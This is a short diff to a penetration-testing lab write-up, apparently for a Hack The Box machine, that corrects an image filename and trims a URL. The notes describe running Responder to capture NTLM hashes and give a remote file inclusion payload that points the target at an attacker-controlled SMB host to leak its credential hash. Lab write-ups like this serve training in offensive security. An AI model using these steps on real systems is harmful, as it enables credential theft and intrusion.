@@ -7,7 +7,7 @@
 
 # resource development
 ## responder tool
-- [NTLM hash](./evidences/stlm_hash.png)
+- [NTLM hash](./evidences/ntlm_hash.png)
 - responder -I tun0
 - listening on the interface connected to the LAN of the target for LLMNR (Link Local Multicast Neighbor Resolution)
 - so that we can get the username and HASH (MD4) used to authenticate via NTLM
@@ -15,7 +15,7 @@
 # initial access
 ## remote-file-intrusion
 - [RFI command](./evidences/remote_file_intrusion.png)
-- http://unika.htb/index.php?page=//10.10.14.78/test
+- index.php?page=//10.10.14.78/test
 - the responder logs are stored in: /usr/share/responder/log
 - the hash inside the log is saved inside [NTLM hash] (./evidences/hash.txt)
 
